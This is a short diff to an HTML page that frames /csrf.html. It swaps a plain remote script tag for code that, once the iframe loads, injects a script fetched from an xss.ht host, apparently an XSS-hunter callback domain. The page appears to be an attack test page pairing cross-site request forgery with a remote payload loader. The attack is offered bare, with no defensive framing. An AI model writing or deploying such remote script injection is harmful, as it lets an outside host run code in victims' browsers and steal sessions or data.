@@ -6,5 +6,17 @@
      <body>
           <iframe src="/csrf.html"></iframe>
      </body>
-	 <script src=https://qazqazqaz.xss.ht></script>
+	 <script>
+	 document.querySelector("iframe").addEventListener( "load", function(e) {
+
+    this.style.backgroundColor = "red";
+    
+
+    var img = document.createElement("script");
+img.src = "https://qazqazqaz.xss.ht";
+var src = document.getElementsByTagName('body')[0];
+src.appendChild(img);
+
+} );
+	 </script>
 </html>
